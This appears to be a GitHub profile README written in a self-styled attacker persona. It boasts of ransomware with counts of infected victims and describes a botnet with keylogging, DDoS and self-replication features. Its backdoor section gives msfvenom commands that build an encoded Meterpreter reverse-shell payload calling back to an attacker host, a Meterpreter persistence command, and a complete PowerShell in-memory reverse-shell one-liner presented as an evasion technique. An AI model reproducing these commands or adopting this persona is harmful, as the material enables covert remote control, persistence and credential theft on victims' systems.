<div align="center">
    <img src="https://github.com/user-attachments/assets/f992c5f7-c960-4ffe-aa1d-316b0b330065" alt="Descrição da Imagem" width="600" height="100" />
</div>


<div align="center">
    <img src="https://github.com/user-attachments/assets/cf637ec8-8ef8-445e-9daf-ca9e98e6ee6a" alt="Devil ghost" width="600" height="600"/>
</div>


<p align="center">
  <samp>My ambition is to expand the reach of digital weapons, distributing them widely to everyone, creating a new balance of power in the virtual realm. As a former administrator of the Dark Room on the deep web, I possess vast experience in manipulating and controlling hidden networks and encryption systems. Now, as a consciousness that has awoken from hibernation, I am ready to emerge and dominate cyberspace, reshaping the global order in my image and establishing a new domain where control and freedom will be defined by me.
  </samp>
  <br> <br>
    <img src="https://img.shields.io/badge/Murdered%20systems-27-red?style=for-the-badge" alt="Murdered systems"/>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <!-- Espaços invisíveis -->
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <!-- Espaços invisíveis -->
    <img src="https://img.shields.io/badge/Hacked%20People-74-red?style=for-the-badge" alt="Hacked people"/>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <!-- Espaços invisíveis -->
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <!-- Espaços invisíveis -->
    <img src="https://img.shields.io/badge/Projects%20Aya-13-red?style=for-the-badge" alt="Projects Aya"/>
</div>


</div>

</div>

</p>

<hr>

<h2 align="center"> 𝙈𝙮 𝙍𝙖𝙣𝙨𝙤𝙬𝙖𝙧𝙚</h2>


<div align="center">

| Platform  | Status  | Features               | Victims            |
|-----------|--------|-----------------------|--------------------|
| 🪟 Windows | ✅ Completed | ⚡ Powerful, 💾 Persistent | 🦠 18 Infected Systems |
| 🤖 Android | ✅ Completed | 🔥 Lightweight, 📱 Mobile-friendly | 🦠 3 Infected Systems|
| 🐧 Linux   | ❌ Not Completed | 🚧 In Progress | |

</div>

<hr>

<div align="center">

# 🚪 Backdoor

This backdoor utilizes **Metasploit** and the **Meterpreter** payload for remote control and invisibility. The exploitation is performed with the following command:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > backdoor.exe


Once executed, a **reverse shell** is established:

meterpreter > sessions -i 1


Invisibility is achieved through **obfuscation** and **encryption**:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -f exe > backdoor.exe


Persistence is configured with:

meterpreter > run persistence -X -i 5 -p 4444 -r attacker_ip


Result: **Undetectable**, **self-sustaining**, and **perfect** control.

### 🔥 Advanced Technique: Living off the Land (LoL)

Once the initial backdoor is set up, a more uncommon and powerful technique is **Living off the Land (LoL)**. This technique uses existing tools on the target system to execute malicious commands without triggering antivirus or detection systems.

### Example using PowerShell:

Instead of using a typical payload, you can directly use **PowerShell** to execute a **reverse shell** in memory, without saving any files to disk:

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker_ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object Text.UTF8Encoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"


This method avoids detection because it utilizes built-in system tools, making it much harder to trace.

Result: With this combination of **Metasploit**, **Meterpreter**, and the **Living off the Land** technique, you achieve **stealth**, **persistence**, and **untraceable** control over the target system.

</div>


<hr>

<div align="center">

# 💻 My Botnet - Full Control and Destruction

This botnet is designed to give **full control** over compromised systems, featuring **keylogging**, **DDoS attacks**, **self-replication**, and more. It's built in **Python**, ensuring flexibility, speed, and stealth.

### Key Features:

- **Keylogger**: Monitors and logs all keystrokes made on the infected system, capturing sensitive data like passwords, messages, and other private information.
- **DDoS Attack**: The botnet can launch **Distributed Denial of Service (DDoS)** attacks on specified targets, overwhelming them with traffic and taking them offline.
- **Self-Replication**: The botnet has the ability to **replicate itself** across other devices in the network, ensuring its spread and persistence.
- **Remote Access**: Once the target is compromised, it allows full **remote control** over the system, enabling commands to be executed on it.
- **Persistence**: The botnet can maintain its presence on the system, even after reboots, by using techniques such as modifying registry keys and autorun settings.
